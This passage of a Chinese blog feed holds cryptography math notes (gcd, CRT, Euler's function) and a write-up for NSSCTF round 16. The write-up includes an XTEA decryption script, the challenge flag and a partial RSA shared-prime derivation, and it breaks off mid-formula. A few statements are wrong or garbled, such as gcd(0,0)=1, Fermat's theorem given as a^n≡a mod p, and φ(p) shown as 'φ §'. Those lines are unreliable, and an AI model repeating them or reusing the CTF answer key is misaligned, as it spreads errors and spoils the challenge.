n)$}<br>记作$[a]_n$简记为$[a]$,最简可化为a(如果没有歧义)</p><p>剩余类中每一个整数都叫做这个剩余类的代表元.<br>$Z_n$表示模n下所有剩余类的集合</p><p>定义剩余类之间的计算：</p><p>$[a]+[b]=[a+b]$</p><p>$[a]<em>[b]=[a</em>b]$</p><p>即：最后得到的是以a+b/ab为代表元的剩余类</p><p>设$u,v\in Z_n$（$Z_n$是包含所有剩余类的集合）,若uv=[1],则u，v互为乘法逆元</p><p>再定义$Z_n^*$为$Z_n$中有乘法逆元的剩余类</p><h3 id="Z-n-与-Z-n-的关系">$Z_n^*$与$Z_n$的关系</h3><ul><li>n为素数：$Z_n^*$=$Z_n$ \ {[0]}</li><li>n为合数：$Z_n^*$$\subsetneq$$Z_n$ \ {[0]}</li></ul><hr><h2 id="中国剩余定理">中国剩余定理</h2><h3 id="一次同余方程组">一次同余方程组</h3><p>设两两互素的模数$n_1,…,n_m\in N$,及任意整数$a_1,…,a_m\in Z$,并设$n=\prod_{i=1}^mn_i$<br>$$<br>\begin{cases}<br>x\equiv a_1(\mod n_1)\<br>…\<br>x\equiv a_m(\mod n_m)<br>\end{cases}<br>$$<br>为了求解这个方程，我们需要中国剩余定理CRT</p><h3 id="中国剩余定理-2">中国剩余定理</h3><p>设两两互素的模数$n_1,…,n_m\in N$,及任意整数$a_1,…,a_m\in Z$,并设$n=\prod_{i=1}^mn_i$，方程组<br>$$<br>\begin{cases}<br>x\equiv a_1(\mod n_1)\<br>…\<br>x\equiv a_m(\mod n_m)<br>\end{cases}<br>$$<br>必有解，设解为$a\in Z$.并且对任意$a’\in Z$,都有<br>$$<br>a’是方程组的解 \iff a \equiv a’(\mod n)<br>$$<br>求解方法：</p><ul><li>得到每个方程组的模数$n_1,n_2,…$</li><li>求$n  =\prod_{i=1}^mn_i$</li><li>求$n_i^*=n/n_i$</li><li>求$n_i^{<em>-1}$(在对应模数下$n_i^</em>$的乘法逆元)</li><li>求$e_i = n_i^{<em>-1} * n_i^</em>$</li><li>求$a = \sum_{i=1}^{m}e_ia_i$</li><li>求$a\mod n$为最后的结果</li></ul><hr><h2 id="欧拉函数">欧拉函数</h2><p>如果已知集合$Z_{n}^*={Z_{n}中有乘法逆元的剩余类}={[a]|a=0,1,…,gcd(a,n)=1}$</p><p>那么，给定一个n，如何求$Z_{n}^*$中有多少个整数/剩余类呢</p><p>定义：欧拉函数，表示为$\phi (n)$，表示大于0，小于等于n的自然数和n互质的数的个数，<br>即：$\phi (n):=\left|Z_{n}^*\right|$（特别地，$\phi (1)=1$）</p><h3 id="性质-2">性质</h3><p>设两两互素的正整数$n_1,…,n_m\in N$并设$n  =\prod_{i=1}^mn_i$，那么有：$\phi (n)=\prod\limits^m_{i=1}\phi (n_i)$<br>用中国剩余定理+中国剩余映射求证</p><p>若p是素数，<br>$\phi (p^k)=p^{k-1}\phi §$<br>$\phi §=p-1$</p><h2 id="欧拉定理和费马小定理">欧拉定理和费马小定理</h2><h3 id="乘法阶">乘法阶</h3><p>设$a\in Z_n^*$，使得$a^k\equiv 1(\mod n)$的最小正整数k称作a在模n下的乘法阶。简写为a的阶.</p><p>如果$a\in Z_n^*$，其阶为k，则$a^0,a^1,a^2,…,a^{k-1}$彼此不同(注意这里是剩余类，要取模)</p><h4 id="性质-3">性质</h4><p>$$<br>a^i\equiv1(\mod n)\iff k|i\<br>a^i\equiv a^j(\mod n) \iff i\equiv j (\mod k)<br>$$</p><h3 id="欧拉定理">欧拉定理</h3><p>若$a\in Z_n^*$，则：$a^{\phi(n)}\equiv 1\mod n$，且$k|\phi(n)$，k为a在模n下的阶。</p><blockquote><p>由于乘法的封闭性，$Z_n^<em>$中每个元素彼此不同，且乘以a后得到的所有元素的集合还是$Z_n^</em>$</p><p>所以：</p><p>$\prod\limits_{b\in Z_n^<em>}b\equiv\prod\limits_{b\in Z_n^</em>}ab \mod n$</p><p>由于b是有剩余类的元素，那么个数是$\phi (n)$个</p><p>所以：</p><p>$\prod\limits_{b\in Z_n^<em>}b\equiv a^{\phi (n)}\prod\limits_{b\in Z_n^</em>}b \mod n$</p><p>得证</p></blockquote><h3 id="费马小定理">费马小定理</h3><p>对欧拉定理左右同乘a得：<br>$$<br>a^n\equiv a\mod p<br>$$<br>对于任意素数p，和整数$a\in Z_p$,都成立</p><hr><p>补充:</p><p>设$a\in Z_n^*,m\in Z$，a在模n下的阶为k，则：$a^m$在模n下的阶为$\frac {k}{gcd(m,k)}$</p><p>即找出k和m的lcm，lcm/m就是阶</p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 同余 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学数学基础1</title>
      <link href="/posts/1de11b10.html"/>
      <url>/posts/1de11b10.html</url>
      
        <content type="html"><![CDATA[<h2 id="整除性">整除性</h2><p>设$a,b\in Z$,如果存在一个$q\in Z$，使得$a=qb$,则称“b<code>整除</code>a”或”<code>b是a的因子</code>“,记为“$b|a$”,并用$b\not\mid a$表示b不整除a</p><p>则：</p><ul><li>$b|0$</li><li>$1|a$</li><li>$0|a \iff a=0$</li><li>$b|a \iff b|-a \iff -b|a$</li></ul><p>且：</p><p>自反性：$a|a$<br>传递性：$(b|a)\land (a|c) \rightarrow b|c$<br>相乘性：$b|a \rightarrow bc|ac$<br>消去性：$(bc|ac) \land (c\not=0) \rightarrow b|a$<br>线性性：$b|a \land b|c\rightarrow\forall s,t\in Z,b|(sa\pm tc)$<br>比较性：$a,b\in N,b|a \rightarrow b\leq a$</p><p>定理一：$设a,b \in Z,则(b|a \land a|b) \iff a=\pm b$</p><hr><h2 id="素数">素数</h2><p>定义：设$n\in N\land n\geq2$,除了$1和n$以外,没有其它正整数整除n，则n称作“<code>素数</code>”（用p表示）；否则称为“合数”</p><p>注1：1既不是素数也不是合数<br>注2：若n为合数，则n=ab，其中$1&lt;a&lt;n,1&lt;b&lt;n$</p><p>引理2-1：任何大于1的整数必有素因子。<br>定理2-1：任何合数$n$都至少有一个不超过$\sqrt n$的素因子<br>定理2-2：(算数基本定理)</p><p>任何非零整数$n$，都可以表示成如下乘积形式：<br>$$<br>n=\pm p{_1}^{e_1}…p{_r}^{e_r}<br>$$<br>其中，$p_1,…p_r$是互不相同的素数，$e_1,…e_r$是正整数。</p><p>定理2-3:素数有无穷多个(欧几里得定理)</p><hr><h2 id="模运算">模运算</h2><p>设$a,b\in Z \land b&gt;0,若q,r\in Z满足a=qb +r,且0\leq r &lt; b,$则定义:</p><p>$a \mod b := r$</p><p>$a \mod n = a - n⌊a/n⌋(向下整除); a∈Z,n∈N*(正整数)$</p><h3 id="性质">性质</h3><p>$b|a \iff a \mod b = 0 $<br>$(a\pm b)\mod n =(a\mod n\pm b\mod n)\mod n $<br>$(a<em>b)\mod n =(a\mod n</em>b\mod n)\mod n $</p><hr><h2 id="最大公约数">最大公约数</h2><h3 id="定义">定义</h3><p>设$a,b\in Z,如果d \in Z  \land d|a,d|b,$则称d是a和b的公因子(公约数)<br>如果$d\geq0$,且a和b的所有公因子都整除d,则称d是a和b的最大公约数,记作gcd(a,b)</p><p>公因数可以是任何整数<br>最大公因数只能是0或正整数，不能是负数</p><p>特别的，gcd(0,0)=1</p><h3 id="互素">互素</h3><p>定义：设$a,b\in Z$,如果gcd(a,b)=1,则称a和b互素</p><p>设gcd(a,b)=d,则存在$q_1,q_2\in Z$,使得$a=q_1d,b=q_2d$,且$gcd(q_1,q_2)=1$,所以$q_1和q_2$互素。</p><h3 id="欧几里得算法-辗转相除法">欧几里得算法/辗转相除法</h3><p>设$a\geq b\geq 0$,求gcd(a,b)<br>数学原理：</p><ul><li>b=0时，gcd(a,0)=a</li><li>b&gt;0时，gcd(a,b)=gcd(b,r)[a=qb+r]</li><li>最后gcd(b,r)=gcd($r,r_1$)=gcd($r_n,0$)=$r_n$</li></ul><h4 id="证明">证明:</h4><p>gcd递归定律：</p><p>$gcd(a,b)=gcd(b,a\mod b)$</p><p>要证:<br>$$<br>gcd(a,b)=gcd(b,a\mod b)<br>$$</p><p>根据整除性定理一：即证:<br>$$<br>gcd(a,b)|gcd(b, a \mod b) \land gcd(b,a \mod b)|gcd(a,b)<br>$$<br>对于前一项：<br>$$<br>gcd(a,b)|gcd(b, a \mod b)<br>$$<br>设 d = gcd(a, b)<br>∴ d|a 且 d|b<br>∵根据模的定义：<br>$$<br>a \mod b是a,b的线性组合<br>$$</p><p>∵根据整除性的线性性：<br>$$<br>d|(a和b的线性组合)<br>$$<br>∴<br>$$<br>gcd(a,b)|gcd(b, a \mod b)<br>$$</p><p>对于后一项：<br>$$<br>gcd(b,a \mod b)|gcd(a,b)<br>$$<br>设 c = gcd(b, a mod b)<br>∴ c|b 且 c|(a mod b)<br>∵ a = qb +r<br>∵ r = a mod b<br>∴ a = qb + a mod b ,即:<br>$$<br>a 是 b 和 (a \mod b) 的线性组合<br>$$<br>∴根据整除性的线性性：<br>$$<br>c | a<br>$$<br>∵ c | a且c | b</p><p>∴<br>$$<br>c | gcd(a,b)<br>$$<br>∴<br>$$<br>gcd(b,a \mod b)|gcd(a,b)<br>$$<br>得证.</p><hr><h2 id="扩展欧几里得定理">扩展欧几里得定理</h2><h3 id="定理5-1-最大公约数表示定理">定理5-1(最大公约数表示定理)</h3><p>设$a,b\in Z$,d=gcd(a,b),则存在$s,t\in Z$,使得$as+bt=d$</p><p>推论：$d|v \iff as+bt=v$</p><p>在欧几里得算法中，计算出的q，根据递推公式：<br>$$<br>s_{i+1}=s_{i-1}-s_iq_i<br>$$</p><p>$$<br>t_{i+1}=t_{i-1}-t_iq_i<br>$$</p><p>同时,$s_0=1,s_1=0,s_0=0,s_1=1$,可以计算出$s_n和t_n即是最后的s和t$</p><p>扩展欧几里得算法就是用来计算定理5-1中的s和t的。同时求出gcd</p><hr><h2 id="最小公倍数">最小公倍数</h2><p>设$a,b\in Z$,若$m\in Z$分别是a,b的倍数，m称作a,b的公倍数</p><p>lcm(a,b):a,b的最小公倍数(可以是负数)</p><ul><li>若$a,b\not= 0$,m是a，b中所有正的公倍数中最小的，m叫作a和b的最小公倍数</li><li>若a或b有一个等于0,lam(a,b)=0</li></ul><p>设$m=lcm(a,b)$,如果$a|c,b|c$,则$m|c$</p><p>$gcd(a,b)=1\rightarrow lcm(a,b)=ab$</p><p>计算lcm：</p><ul><li>$lcm(a,b)=\frac{ab}{gcd(a,b)}$</li><li>两个数迭代加自己直到相等</li></ul>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 数学 </tag>
            
            <tag> 知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF_r16题目复现</title>
      <link href="/posts/6e766646.html"/>
      <url>/posts/6e766646.html</url>
      
        <content type="html"><![CDATA[<p>（好难，被薄纱了QAQ）</p><h2 id="RE">RE</h2><h3 id="test-your-Debugger">test your Debugger</h3><p>直接动态调试在提示的位置打断点</p><p>得结果</p><p>略</p><h3 id="CompileMe">CompileMe!!!</h3><p>文件打开以后是sln源代码文件？？甚至不用逆向？<br>打开之后：完型填空？</p><p>看起来是一个简单的XTEA，但是vs一开就崩溃，vscode也不知道为什么不能运行。。。那先看看题（补全后）：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">NSSCTF</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> key = <span class="keyword">new</span> <span class="built_in">ulong</span>[] &#123; <span class="number">0x57656c636f6d6520</span>, <span class="number">0x746f204e53534354</span>, <span class="number">0x4620526f756e6423</span>, <span class="number">0x3136204261736963</span> &#125;;</span><br><span class="line">            <span class="keyword">var</span> c = <span class="keyword">new</span> <span class="built_in">ulong</span>[] &#123; <span class="number">0xc60b34b2bff9d34a</span>, <span class="number">0xf50af3aa8fd96c6b</span>, <span class="number">0x680ed11f0c05c4f1</span>, <span class="number">0x6e83b0a4aaf7c1a3</span>, <span class="number">0xd69b3d568695c3c5</span>, <span class="number">0xa88f4ff50a351da2</span>, <span class="number">0x5cfa195968e1bb5b</span>, <span class="number">0xc4168018d92196d9</span> &#125;;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">ulong</span> e = <span class="number">0x9E3779B9</span>;</span><br><span class="line">            <span class="keyword">var</span> delta = Enumerable.Range(<span class="number">0</span>, <span class="number">32</span>).Select(index =&gt; e * (<span class="number">32</span> - (<span class="built_in">uint</span>)index)).ToArray();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> decryptedBlocks = c.Select((block, index) =&gt; <span class="keyword">new</span> &#123; Value = block, Index = index &#125;)</span><br><span class="line">                .GroupBy(item =&gt; item.I ndex / <span class="number">2</span>)</span><br><span class="line">                .Select(<span class="keyword">group</span> =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">ulong</span> b1 = <span class="keyword">group</span>.ElementAt(<span class="number">0</span>).Value;</span><br><span class="line">                    <span class="built_in">ulong</span> b2 = <span class="keyword">group</span>.ElementAt(<span class="number">1</span>).Value;</span><br><span class="line">                    <span class="built_in">ulong</span> sum = e * <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">                    delta.ToList().ForEach(currentDelta =&gt;</span><br><span class="line">                    &#123;</span><br><span class="line">                        b2 -= (((b1 &lt;&lt; <span class="number">4</span>) ^ (b1 &gt;&gt; <span class="number">5</span>)) + b1) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">                        sum -= e;</span><br><span class="line">                        b1 -= (((b2 &lt;&lt; <span class="number">4</span>) ^ (b2 &gt;&gt; <span class="number">5</span>)) + b2) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">                    &#125;);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span>[] &#123; b1, b2 &#125;;</span><br><span class="line">                &#125;)</span><br><span class="line">                .SelectMany(block =&gt; block)</span><br><span class="line">                .ToArray();</span><br><span class="line"></span><br><span class="line">            <span class="built_in">ulong</span>[] decryptedText = <span class="keyword">new</span> <span class="built_in">ulong</span>[decryptedBlocks.Length];</span><br><span class="line">            Array.Copy(decryptedBlocks, decryptedText, decryptedText.Length);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            decryptedText.SelectMany(block =&gt; BitConverter.GetBytes(<span class="keyword">new</span> ZZZ(block).GetVal()).Reverse()).ToList().ForEach(byteValue =&gt; Console.Write(Encoding.ASCII.GetString(<span class="keyword">new</span>[] &#123; byteValue &#125;)));</span><br></pre></td></tr></table></figure><p>但是逻辑可以看懂，可以尝试用C重写一遍代码</p><p>但是后面有一个调用zzz</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">ZZZ</span>(<span class="title">ulong</span> <span class="title">val</span>) : <span class="title">ZZY</span>(<span class="title">val</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">ulong</span> <span class="title">GetVal</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">base</span>.GetVal();</span><br><span class="line">        <span class="keyword">return</span> val + <span class="number">0x413FD584E295889</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而ZZZ到A的一万六千行代码都是类似这个的函数</p><p>（事后才发现这里调用的代码是base.GetVal()只是调用了继承自ZZY的getval函数然而没有返回值到确定的变量）</p><p>那么就需要用一个函数来读取并输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lines = <span class="built_in">open</span>(<span class="string">&#x27;Program.cs&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).readlines()</span><br><span class="line"> </span><br><span class="line">a = <span class="string">b&#x27;unsigned __int64 (unsigned __int64 val) &#123;\n&#x27;</span></span><br><span class="line">c = <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="keyword">if</span> line.startswith(<span class="string">b&#x27;            return val&#x27;</span>):</span><br><span class="line">        a += <span class="string">b&#x27;    val = &#x27;</span>+line[<span class="number">18</span>:]</span><br><span class="line">a += c</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;c.py&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(a)</span><br></pre></td></tr></table></figure><p>然后复制这个函数到解密里面并调用。</p><p>最后的代码是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dec</span><span class="params">(<span class="type">unsigned</span> __int64 *a)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> __int64 b2; </span><br><span class="line">    <span class="type">unsigned</span> __int64 b1; </span><br><span class="line">    b1 = *a;</span><br><span class="line">    b2 = a[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> e = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="type">unsigned</span> __int64 key[<span class="number">4</span>] = &#123; <span class="number">0x57656c636f6d6520</span>, <span class="number">0x746f204e53534354</span>, <span class="number">0x4620526f756e6423</span>, <span class="number">0x3136204261736963</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> __int64 sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i) &#123;</span><br><span class="line"></span><br><span class="line">        b2 -= (((b1 &lt;&lt; <span class="number">4</span>) ^ (b1 &gt;&gt; <span class="number">5</span>)) + b1) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= e;</span><br><span class="line">        b1 -= (((b2 &lt;&lt; <span class="number">4</span>) ^ (b2 &gt;&gt; <span class="number">5</span>)) + b2) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    *a = b1;</span><br><span class="line">    a[<span class="number">1</span>] = b2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">ccc</span><span class="params">(<span class="type">unsigned</span> __int64 val)</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line"> &#125;<span class="comment">//写完就5万字了</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">unsigned</span> __int64 Q[<span class="number">8</span>] = &#123;</span><br><span class="line">    <span class="number">0xc60b34b2bff9d34a</span>, <span class="number">0xf50af3aa8fd96c6b</span>, <span class="number">0x680ed11f0c05c4f1</span>, <span class="number">0x6e83b0a4aaf7c1a3</span>, </span><br><span class="line">    <span class="number">0xd69b3d568695c3c5</span>, <span class="number">0xa88f4ff50a351da2</span>, <span class="number">0x5cfa195968e1bb5b</span>, <span class="number">0xc4168018d92196d9</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        dec(&amp;Q[k*<span class="number">2</span>]);</span><br><span class="line">        <span class="comment">//sdecrypt(&amp;Q[k * 2], &amp;Q[k * 2 + 1]);</span></span><br><span class="line"></span><br><span class="line">        Q[k * <span class="number">2</span>] = ccc(Q[k * <span class="number">2</span>]);</span><br><span class="line">        Q[k * <span class="number">2</span> +<span class="number">1</span>] = ccc(Q[k * <span class="number">2</span>+<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%#llx,\n&quot;</span>, Q[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;Q[i]);</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x4e53534354467b35</span>,</span><br><span class="line"><span class="number">0x384d745534695478</span>,</span><br><span class="line"><span class="number">0x34754b7538505648</span>,</span><br><span class="line"><span class="number">0x4559795939613774</span>,</span><br><span class="line"><span class="number">0x5a30646171564966</span>,</span><br><span class="line"><span class="number">0x4a5656396b704d52</span>,</span><br><span class="line"><span class="number">0x5a37757644475948</span>,</span><br><span class="line"><span class="number">0x52754a35384d7a7d</span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">NSSCTF</span>&#123;<span class="number">58</span>MtU4iTx4uKu8PVHEYyY9a7tZ0daqVIfJVV9kpMRZ7uvDGYHRuJ58Mz&#125;</span><br></pre></td></tr></table></figure><h2 id="CRYPTO">CRYPTO</h2><h3 id="pr">pr</h3><p>打开题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag=plaintext = <span class="string">&#x27;NSSCTF&#123;****************&#125;&#x27;</span></span><br><span class="line">charset = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">padding_length = <span class="number">100</span> - <span class="built_in">len</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(padding_length):</span><br><span class="line">    plaintext += random.choice(charset)</span><br><span class="line"></span><br><span class="line">e = <span class="number">31413537523</span></span><br><span class="line">message = bytes_to_long(plaintext.encode())</span><br><span class="line"><span class="keyword">assert</span> message &gt; (<span class="number">1</span> &lt;&lt; <span class="number">512</span>)</span><br><span class="line"><span class="keyword">assert</span> message &lt; (<span class="number">1</span> &lt;&lt; <span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">prime_p = getPrime(<span class="number">512</span>)</span><br><span class="line">prime_q = getPrime(<span class="number">512</span>)</span><br><span class="line">prime_r = getPrime(<span class="number">512</span>)</span><br><span class="line">n1 = prime_p * prime_q</span><br><span class="line">n2 = prime_q * prime_r</span><br><span class="line">ciphertext1 = <span class="built_in">pow</span>(message, e, n1)</span><br><span class="line">ciphertext2 = <span class="built_in">pow</span>(message, e, n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c1=&#x27;</span>, ciphertext1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2=&#x27;</span>, ciphertext2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>, prime_p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;r=&#x27;</span>, prime_r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c1= 36918910341116680090654563538246204134840776220077189276689868322808977412566781872132517635399441578464309667998925236488280867210758507758915311644529399878185776345227817559234605958783077866016808605942558810445187434690812992072238407431218047312484354859724174751718700409405142819140636116559320641695</span></span><br><span class="line"><span class="string">c2= 15601788304485903964195122196382181273808496834343051747331984997977255326224514191280515875796224074672957848566506948553165091090701291545031857563686815297483181025074113978465751897596411324331847008870832527695258040104858667684793196948970048750296571273364559767074262996595282324974180754813257013752</span></span><br><span class="line"><span class="string">p= 12101696894052331138951718202838643670037274599483776996203693662637821825873973767235442427190607145999472731101517998719984942030184683388441121181962123</span></span><br><span class="line"><span class="string">r= 10199001137987151966640837133782537428248507382360655526592866939552984259171772190788036403425837649697437126360866173688083643144865107648483668545682383</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">过程:</span></span><br><span class="line">取质数p,q,r</span><br><span class="line">e = ...</span><br><span class="line">n1 = pq</span><br><span class="line">n2 = qr</span><br><span class="line">c1 = m^e mod n1</span><br><span class="line">c2 = m^e mod n2</span><br><span class="line">已知c1,c2,e,p,r求m</span><br></pre></td></tr></table></figure><p>根据<br>$$<br>\begin{cases}<br>c_1\equiv m^e(\mod n_1)\\<br>c_2\equiv m^e(\mod n_2)<br>\end{cases}<br>$$<br>和同余定理<br>$$<br>若a-b是n的倍数,那么a和b在\mod n下同余<br>$$<br>因为原式可得<br>$$<br>\begin{cases}<br>c_1-m^e=kpq\\<br>c_2-m^e=kqr<br>\end{cases}<br>$$<br>所以<br>$$<br>\begin{cases}<br>c_1\equiv m^e(\mod p)\\<br>c_2\equiv m^e(\mod r)<br>\end{cases}<br>$$<br>所以<br>$$<br>\begin{cases}<br>m^e\equiv c_1(\mod p)\\<br>m^e\equiv c_2(\mod 